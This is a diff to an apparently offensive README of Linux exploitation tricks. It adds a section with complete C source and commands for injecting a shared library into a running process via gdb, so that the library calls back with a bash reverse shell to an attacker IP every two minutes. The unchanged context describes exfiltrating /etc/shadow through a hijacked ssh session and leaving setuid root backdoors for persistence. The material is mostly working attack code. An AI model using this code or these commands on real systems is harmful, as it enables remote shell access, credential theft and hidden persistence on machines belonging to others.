@@ -1,7 +1,7 @@
 # Linux-Trix
 An assortment of techniques that can be used to exploit Linux.  Most of these assume that you have or can attain root privileges on the host.  You will need to change IP addresses and other references in the examples to fit your environment.
 
-## Stuffing commands into an existing ssh session
+## >> Stuffing commands into an existing ssh session
 
 **This example assumes the following**<br />
 * The attacking Linux machine (A) is 192.168.1.7
@@ -48,7 +48,7 @@ int main() {
 **Execute** `ptshijack` **on (B) to send** `/etc/shadow` **from (C) to (A)**<br />
 SIGINT (ctrl-c) netcat on (A) to terminate the background process on (C)<br />
 
-## Persistence with setuid
+## >> Persistence with setuid
 
 Once you have root on a system leave these behind to exploit later:<br >
 * `chmod u+s /usr/bin/chmod` and `chmod u+s /usr/bin/chown`, will allow you to create files as an ordinary user that execute as root.
@@ -73,3 +73,71 @@ int main(int argc, char **argv)
 ```
 setuid as root `chown root:root .setuid-shell` then `chmod u+s .setuid-shell`<br />
 Now execute `.setuid-shell` and see that you are root by issuing the `id` command.
+
+## >> Injecting a shared object into a running process to get a reverse shell
+
+This technique will dynamically load a library (.so file) into an existing process to get a reverse shell as the user the process is running as.<br />
+The attacker IP in this example is 192.168.1.19 and will be listening on port 4444 for the reverse shell.<br />
+`nc -nlvp 4444`
+
+**Compile the following C program**<br />
+`gcc -O2 -fPIC -o libcallback.so ./libcallback.c -lpthread -shared`<br />
+```c
+#include <pthread.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+/*
+   (compile)
+   gcc -O2 -fPIC -o libcallback.so ./libcallback.c -lpthread -shared
+   (copy)
+   cp ./libcallback.so /tmp/libcallback.so
+*/
+
+// callback retry interval and reverse shell destination
+#define WAITSEC  120
+#define RVSADDR "192.168.1.19"
+#define RVSPORT "4444"
+
+// reverse shell command
+#define COMMAND "echo 'exec >&/dev/tcp/" RVSADDR "/" RVSPORT "; exec 0>&1' | /bin/bash"
+
+void *callback(void *a);
+
+__attribute__((constructor))
+void start_callbacks()
+{
+   pthread_t tid;
+   pthread_attr_t attr;
+
+   if(pthread_attr_init(&attr) == -1)
+   {
+      return;
+   }
+   if(pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED) == -1)
+   {
+      return;
+   }
+   pthread_create(&tid, &attr, callback, NULL);
+}
+
+void *callback(void *a)
+{
+   while(1)
+   {
+      system(COMMAND);
+      sleep(WAITSEC);
+   }
+   return NULL;
+}
+```
+**Copy the library file to the /tmp directory**<br />
+`cp ./libcallback.so /tmp/libcallback.so`
+
+**Find the PID of a target process to inject the library into**<br />
+(e.g. PID selected is 2739)<br />
+`echo 'print __libc_dlopen_mode("/tmp/libcallback.so", 2)' | gdb -p 2739`
+
+You should see a connection to your netcat session listening on port 4444.
